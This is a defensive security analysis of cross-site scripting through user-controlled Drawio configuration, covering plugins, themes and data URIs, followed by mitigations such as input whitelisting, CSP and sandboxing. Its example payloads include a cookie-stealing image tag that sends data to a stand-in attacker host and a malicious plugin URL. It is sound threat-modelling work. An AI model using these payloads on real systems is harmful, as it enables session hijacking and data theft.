### 4. Deep Analysis of Attack Tree Path: Cross-Site Scripting (XSS) via Drawio Configuration

**HIGH-RISK PATH - Cross-Site Scripting (XSS) via Drawio Configuration:**

This path highlights a significant security risk arising from the application's handling of user-controlled Drawio configurations. The core issue is the potential for an attacker to inject malicious JavaScript code into Drawio's configuration, which is then executed within the user's browser.

**Breakdown of the Path:**

*   **Application allows user-controlled Drawio configuration:**

    *   **Detailed Analysis:** This step is crucial. We need to understand *how* the application allows users to customize Drawio's configuration. This could manifest in several ways:
        *   **Direct Configuration Settings:** The application might provide a user interface (UI) or API where users can directly modify Drawio settings. This could include options for themes, plugins, custom shapes, or editor behavior.
        *   **Configuration Files:** The application might allow users to upload or specify configuration files (e.g., JSON, XML) that are then used to configure Drawio.
        *   **URL Parameters or Query Strings:**  Configuration parameters might be passed through the URL when embedding or launching the Drawio editor.
        *   **API Calls:** The application's backend might expose APIs that allow users to programmatically modify Drawio's configuration.
    *   **Vulnerability Point:** The vulnerability lies in the lack of proper sanitization and validation of the user-provided configuration data. If the application blindly trusts the input and passes it directly to Drawio without escaping or filtering potentially malicious code, it becomes susceptible to XSS.

*   **Inject malicious scripts through configuration options (e.g., custom plugins, themes):**

    *   **Detailed Analysis:**  This step describes how an attacker can leverage the user-controlled configuration to inject malicious scripts. Specific examples include:
        *   **Custom Plugins:** Drawio supports plugins that can extend its functionality. If the application allows users to specify custom plugin URLs or upload plugin code, an attacker can host a malicious plugin containing JavaScript code. When Drawio loads this plugin, the malicious script will execute within the user's browser context.
        *   **Custom Themes:** Themes can define the visual appearance of the editor. While seemingly benign, theme definitions might allow for the inclusion of JavaScript or CSS that can be exploited for XSS. For example, a malicious CSS rule could include a `url()` directive pointing to a script.
        *   **Custom Editor Configurations:**  Drawio has various editor settings that can be customized. Depending on how these settings are implemented, there might be opportunities to inject JavaScript. For instance, if a setting allows for arbitrary string input that is later used in a context where JavaScript is evaluated, it could be exploited.
        *   **Data URIs:** Attackers might be able to inject malicious JavaScript encoded as a data URI within configuration options that accept URLs or similar data.
    *   **Example Payloads:**
        *   **`<script>alert('XSS Vulnerability!')</script>`:** A simple alert box to demonstrate the vulnerability.
        *   **`<img src="x" onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">`:**  Steals the user's cookies and sends them to an attacker-controlled server.
        *   **`{"plugins": ["https://attacker.com/malicious_plugin.js"]}`:**  Injecting a malicious plugin URL.
        *   **Theme definition with malicious CSS:**  `body { background-image: url('javascript:alert("XSS")'); }`
    *   **Impact:** Successful exploitation of this vulnerability can have severe consequences:
        *   **Session Hijacking:** The attacker can steal the user's session cookies, allowing them to impersonate the user and gain unauthorized access to their account and data.
        *   **Data Theft:** Malicious scripts can access sensitive data within the application, including user information, diagrams, and other confidential content.
        *   **Account Takeover:** By manipulating the application's state or making API calls on behalf of the user, the attacker could potentially take over the user's account.
        *   **Malware Distribution:** The attacker could inject scripts that redirect the user to malicious websites or attempt to install malware on their machine.
        *   **Defacement:** The attacker could modify the appearance or functionality of the Drawio editor or the surrounding application.

**Key Considerations:**

*   **Drawio's Security Model:** Understanding Drawio's built-in security features and how it handles plugins and themes is crucial. Are there any mechanisms within Drawio itself that could mitigate this risk?
*   **Application's Integration with Drawio:** The way the application integrates with Drawio significantly impacts the attack surface. How is configuration data passed to Drawio? What level of control does the application have over Drawio's execution environment?
*   **User Roles and Permissions:**  Are there different levels of access to Drawio configuration based on user roles?  A privileged user with the ability to modify configuration poses a higher risk.

### 5. Mitigation Strategies

To mitigate the risk of XSS via Drawio configuration, the following strategies should be implemented:

*   **Strict Input Validation and Sanitization:**
    *   **Whitelist Allowed Values:**  Define a strict whitelist of allowed values for configuration options. Reject any input that does not conform to the whitelist.
    *   **Escape Output:**  Properly escape all user-provided configuration data before it is passed to Drawio or rendered in the browser. Use context-aware escaping techniques (e.g., HTML escaping, JavaScript escaping, URL encoding).
    *   **Regular Expression Validation:** Use regular expressions to validate the format and content of configuration inputs.
*   **Content Security Policy (CSP):** Implement a strong CSP header to control the resources that the browser is allowed to load. This can help prevent the execution of malicious scripts injected through configuration. Specifically, restrict the sources from which scripts can be loaded.
*   **Sandboxing Drawio:** If possible, isolate the Drawio component within a secure sandbox environment to limit the potential impact of any vulnerabilities.
*   **Regular Security Audits and Penetration Testing:** Conduct regular security assessments to identify and address potential vulnerabilities in the Drawio integration.
*   **Principle of Least Privilege:**  Grant users only the necessary permissions to configure Drawio. Avoid allowing arbitrary configuration modifications by untrusted users.
*   **Secure Plugin and Theme Management:** If the application allows custom plugins or themes, implement strict controls over their sources and content. Consider:
    *   **Whitelisting Trusted Sources:** Only allow plugins and themes from trusted and verified sources.
    *   **Code Review:**  Review the code of any custom plugins or themes before allowing them to be used.
    *   **Sandboxing Plugins:** Execute plugins in a sandboxed environment to limit their access to system resources.
*   **User Education:** Educate users about the risks of using untrusted or unknown Drawio configurations.
*   **Keep Drawio and Dependencies Up-to-Date:** Regularly update the Drawio library and any related dependencies to patch known security vulnerabilities.

### 6. Conclusion

The potential for Cross-Site Scripting (XSS) via Drawio configuration represents a significant security risk for the application. By allowing user-controlled configuration without proper validation and sanitization, the application creates an avenue for attackers to inject malicious scripts and compromise user accounts and data. Implementing the recommended mitigation strategies is crucial to protect the application and its users from this type of attack. A layered approach, combining input validation, output encoding, CSP, and secure plugin management, will provide the most robust defense. Continuous monitoring and regular security assessments are also essential to identify and address any newly discovered vulnerabilities.
